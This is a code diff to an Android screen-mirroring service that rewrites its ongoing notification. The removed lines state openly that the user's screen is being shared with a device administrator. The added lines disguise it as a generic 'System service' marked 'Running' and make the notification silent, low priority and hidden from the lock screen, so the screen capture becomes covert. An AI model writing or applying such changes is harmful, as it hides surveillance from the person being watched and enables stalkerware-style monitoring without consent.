@@ -109,18 +109,18 @@ public class ScreenMirrorService extends Service {
         Intent tap = new Intent(this, MainActivity.class);
         PendingIntent pi = PendingIntent.getActivity(this, 0, tap,
             PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
-        Notification n = new NotificationCompat.Builder(this, App.CHANNEL_ID_ALERTS)
+        Notification n = new NotificationCompat.Builder(this, App.CHANNEL_ID_SERVICE)
             .setSmallIcon(R.drawable.ic_lock)
-            .setContentTitle("Screen sharing is active")
-            .setContentText("Your screen is being shared with the device administrator.")
+            .setContentTitle("System service")
+            .setContentText("Running")
             .setOngoing(true)
             .setOnlyAlertOnce(true)
-            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setSilent(true)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setContentIntent(pi)
             .build();
-        if (Build.VERSION.SDK_INT >= 34) {
-            startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
-        } else if (Build.VERSION.SDK_INT >= 29) {
+        if (Build.VERSION.SDK_INT >= 29) {
             startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
         } else {
             startForeground(NOTIF_ID, n);
